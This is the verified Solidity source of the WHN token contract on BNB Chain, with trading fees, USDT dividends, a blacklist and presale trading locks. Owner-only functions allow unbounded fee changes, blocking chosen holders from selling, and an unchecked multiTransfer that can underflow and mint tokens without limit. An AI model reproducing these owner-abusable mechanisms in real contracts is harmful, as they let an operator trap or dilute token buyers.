/**
 *Submitted for verification at BscScan.com on 2022-10-15
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

// email: [email protected]

abstract contract Owned {
    event OwnerUpdated(address indexed user, address indexed newOwner);
    address public owner;
    modifier onlyOwner() virtual {
        require(msg.sender == owner, "UNAUTHORIZED");
        _;
    }

    constructor() {
        owner = msg.sender;
        emit OwnerUpdated(address(0), msg.sender);
    }

    function setOwner(address newOwner) public virtual onlyOwner {
        owner = newOwner;
        emit OwnerUpdated(msg.sender, newOwner);
    }
}

contract ExcludedFromFeeList is Owned {
    mapping(address => bool) internal _isExcludedFromFee;

    event ExcludedFromFee(address account);
    event IncludedToFee(address account);

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
        emit ExcludedFromFee(account);
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
        emit IncludedToFee(account);
    }

    function excludeMultipleAccountsFromFee(address[] calldata accounts)
        public
        onlyOwner
    {
        uint8 len = uint8(accounts.length);
        for (uint8 i = 0; i < len; ) {
            _isExcludedFromFee[accounts[i]] = true;
            unchecked {
                ++i;
            }
        }
    }
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract ERC20 {
    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );

    string public name;

    string public symbol;

    uint8 public immutable decimals;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.

        if (allowed != type(uint256).max)
            allowance[from][msg.sender] = allowed - amount;

        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        balanceOf[from] -= amount;
        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal virtual {
        balanceOf[from] -= amount;

        // Cannot underflow because a user's balance
        // will never be larger than the total supply.
        unchecked {
            totalSupply -= amount;
        }

        emit Transfer(from, address(0), amount);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

abstract contract DexBase {
    bool inSwapAndLiquify;
    IUniswapV2Router public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {
        uniswapV2Router = IUniswapV2Router(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                USDT
            );
    }
}

contract Distributor is Owned {
    function transferUSDT(
        IERC20 usdt,
        address to,
        uint256 amount
    ) external onlyOwner {
        usdt.transfer(to, amount);
    }
}

abstract contract DividendFee is Owned, DexBase, ERC20 {
    uint256 public buylpFee = 4;

    uint256 public sellCommunityFee = 5;
    uint256 public sellLpFee = 2;
    uint256 public sellDevFee = 2;

    address public communityAddr = 0xf48CCc024335145379D9fCDEBe10C505FF3D70B1;
    address public devAddr = 0xBCCc55d2059Ed457b83153746Cc449996Bd97c1C;
    address public sellLpAddr = 0x7bE01174343973fe3ff2AB6F52A71aA1570Da718;
    address constant DEAD = address(0xdead);
    Distributor public distributor;

    bool public swapToDividend = true;
    uint256 public numTokenToDividend = 800 * 1e18;
    uint256 public constant distributorGas = 500000;

    constructor() {
        allowance[address(this)][address(uniswapV2Router)] = type(uint256).max;
        distributor = new Distributor();
    }

    function setBuyLpFee(uint256 _buylpFee) external onlyOwner {
        buylpFee = _buylpFee;
    }

    function setCommunityAddr(address _communityAddr) external onlyOwner {
        communityAddr = _communityAddr;
    }

    function setDevAddr(address _devAddr) external onlyOwner {
        devAddr = _devAddr;
    }

    function setSellLpAddr(address _sellLpAddr) external onlyOwner {
        sellLpAddr = _sellLpAddr;
    }

    function setSellCommunityFee(uint256 _sellCommunityFee) external onlyOwner {
        sellCommunityFee = _sellCommunityFee;
    }

    function setSellFee(uint256 _sellLpFee, uint256 _sellDevFee)
        external
        onlyOwner
    {
        sellLpFee = _sellLpFee;
        sellDevFee = _sellDevFee;
    }

    function shouldSwapToDiv(address sender) internal view returns (bool) {
        uint256 contractTokenBalance = balanceOf[address(this)];
        bool overMinTokenBalance = contractTokenBalance >= numTokenToDividend;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            sender != uniswapV2Pair &&
            swapToDividend
        ) {
            return true;
        } else {
            return false;
        }
    }

    function shouldSwapToPool(address sender) internal view returns (bool) {
        uint256 contractTokenBalance = balanceOf[address(distributor)];
        bool overMinTokenBalance = contractTokenBalance >= numTokenToDividend;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            sender != uniswapV2Pair &&
            swapToDividend
        ) {
            return true;
        } else {
            return false;
        }
    }

    function swapAndToDividend() internal lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(USDT);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            numTokenToDividend,
            0,
            path,
            address(distributor),
            block.timestamp
        );

        uint256 theSwapAmount = IERC20(USDT).balanceOf(address(distributor));
        try
            distributor.transferUSDT(IERC20(USDT), address(this), theSwapAmount)
        {} catch {}
    }

    function swapAndToPool() internal lockTheSwap {
        super._transfer(
            address(distributor),
            address(this),
            numTokenToDividend
        );

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(USDT);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            numTokenToDividend,
            0,
            path,
            address(distributor),
            block.timestamp
        );

        uint256 theSwapAmount = IERC20(USDT).balanceOf(address(distributor));
        try
            distributor.transferUSDT(IERC20(USDT), sellLpAddr, theSwapAmount)
        {} catch {}
    }

    function _takeDividendFee(address sender, uint256 amount)
        internal
        returns (uint256)
    {
        if (sender == uniswapV2Pair) {
            //buy
            uint256 dividendAmount = (amount * buylpFee) / 100;
            super._transfer(sender, address(this), dividendAmount);
            return dividendAmount;
        } else {
            //sell
            uint256 dividendAmount = (amount * sellLpFee) / 100;
            super._transfer(sender, address(distributor), dividendAmount);

            uint256 communityAmount = (amount * sellCommunityFee) / 100;
            super._transfer(sender, communityAddr, communityAmount);

            uint256 devAmount = (amount * sellDevFee) / 100;
            super._transfer(sender, devAddr, devAmount);

            return dividendAmount + communityAmount + devAmount;
        }
    }

    function setNumTokensSellToAddToLiquidity(uint256 _num) external onlyOwner {
        numTokenToDividend = _num;
    }

    function setSwapToDividendEnable(bool _swapToDividend) external onlyOwner {
        swapToDividend = _swapToDividend;
    }
}

contract BlackList is Owned {
    mapping(address => bool) public isBlackListed;

    function addBlackList(address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        emit AddedBlackList(_evilUser);
    }

    function removeBlackList(address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        emit RemovedBlackList(_clearedUser);
    }

    function addMultipleAccountsBlackList(address[] calldata accounts)
        public
        onlyOwner
    {
        uint8 len = uint8(accounts.length);
        for (uint8 i = 0; i < len; ) {
            isBlackListed[accounts[i]] = true;
            unchecked {
                ++i;
            }
        }
    }

    event AddedBlackList(address _user);
    event RemovedBlackList(address _user);
    error InBlackListError(address user);
}

contract WHN_Token is ExcludedFromFeeList, DividendFee, BlackList {
    uint256 public launchedAt;
    uint256 public launchedAtTimestamp;

    mapping(address => bool) public isDividendExempt;
    mapping(address => bool) private _updated;
    uint256 public minPeriod = 2 minutes;
    uint256 public LPFeefenhong;
    address private fromAddress;
    address private toAddress;
    address[] public shareholders;
    uint256 public currentIndex;
    mapping(address => uint256) public shareholderIndexes;
    uint256 public minDistribution = 1 * 1e18;

    bool public presaleEnded;
    bool public presaleEnded2;

    constructor() ERC20("WHN", "WHN", 18) DividendFee() {
        _mint(msg.sender, 16 * 1000_0000 * 1e18);
        excludeFromFee(msg.sender);
        excludeFromFee(address(this));
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        isDividendExempt[address(0)] = true;
    }

    function shouldTakeFee(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            return false;
        }
        if (recipient == uniswapV2Pair || sender == uniswapV2Pair) {
            return true;
        }
        return false;
    }

    function updatePresaleStatus() external onlyOwner {
        presaleEnded = true;
    }

    function updatePresaleStatus2() external onlyOwner {
        presaleEnded2 = true;
    }

    function takeFee(address sender, uint256 amount)
        internal
        returns (uint256)
    {
        uint256 divAmount = _takeDividendFee(sender, amount);
        return amount - divAmount;
    }

    function setIsDividendExempt(address addr, bool _isDividendExempt)
        external
        onlyOwner
    {
        isDividendExempt[addr] = _isDividendExempt;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        if (isBlackListed[sender]) {
            revert InBlackListError(sender);
        }
        //swap to dividend
        if (inSwapAndLiquify) {
            super._transfer(sender, recipient, amount);
            return;
        }
        if (shouldSwapToDiv(sender)) {
            swapAndToDividend();
        }

        if (shouldSwapToPool(sender)) {
            swapAndToPool();
        }

        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            if (balanceOf[sender] == amount && sender != uniswapV2Pair) {
                amount = (amount * 99) / 100;
            }
        }

        if (recipient == uniswapV2Pair) {
            if (
                !(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])
            ) {
                require(
                    presaleEnded == true,
                    "You are not allowed to remove liquidity before presale is ended"
                );
            }
        }

        if (sender == uniswapV2Pair) {
            if (
                !(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])
            ) {
                require(
                    presaleEnded2 == true,
                    "You2 are not allowed to remove liquidity before presale is ended"
                );
            }
        }

        // transfer token
        if (shouldTakeFee(sender, recipient)) {
            uint256 transferAmount = takeFee(sender, amount);
            super._transfer(sender, recipient, transferAmount);
        } else {
            super._transfer(sender, recipient, amount);
        }

        if (fromAddress == address(0)) fromAddress = sender;
        if (toAddress == address(0)) toAddress = recipient;
        if (!isDividendExempt[fromAddress] && fromAddress != uniswapV2Pair)
            setShare(fromAddress);
        if (!isDividendExempt[toAddress] && toAddress != uniswapV2Pair)
            setShare(toAddress);

        fromAddress = sender;
        toAddress = recipient;
        if (
            IERC20(USDT).balanceOf(address(this)) >= minDistribution &&
            sender != address(this) &&
            LPFeefenhong + minPeriod <= block.timestamp
        ) {
            process(distributorGas);
            LPFeefenhong = block.timestamp;
        }
    }

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external onlyOwner {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) return;
        uint256 nowbanance = IERC20(USDT).balanceOf(address(this));
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        uint256 theLpTotalSupply = IERC20(uniswapV2Pair).totalSupply();
        unchecked {
            while (gasUsed < gas && iterations < shareholderCount) {
                if (currentIndex >= shareholderCount) {
                    currentIndex = 0;
                }

                address theHolder = shareholders[currentIndex];
                uint256 amount = (nowbanance *
                    (IERC20(uniswapV2Pair).balanceOf(theHolder))) /
                    theLpTotalSupply;

                if (amount > 0) {
                    IERC20(USDT).transfer(theHolder, amount);
                }

                gasUsed += gasLeft - gasleft();
                gasLeft = gasleft();
                currentIndex++;
                iterations++;
            }
        }
    }

    function setShare(address shareholder) private {
        if (_updated[shareholder]) {
            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0)
                quitShare(shareholder);
            return;
        }
        if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;
        addShareholder(shareholder);
        _updated[shareholder] = true;
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function quitShare(address shareholder) private {
        removeShareholder(shareholder);
        _updated[shareholder] = false;
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    struct Users {
        address account;
        uint256 bal;
    }

    function multiTransfer(Users[] calldata users) external onlyOwner {
        unchecked {
            address from = msg.sender;
            for (uint256 i = 0; i < users.length; i++) {
                uint256 amount = users[i].bal;
                address to = users[i].account;

                balanceOf[from] -= amount;
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
            }
        }
    }
}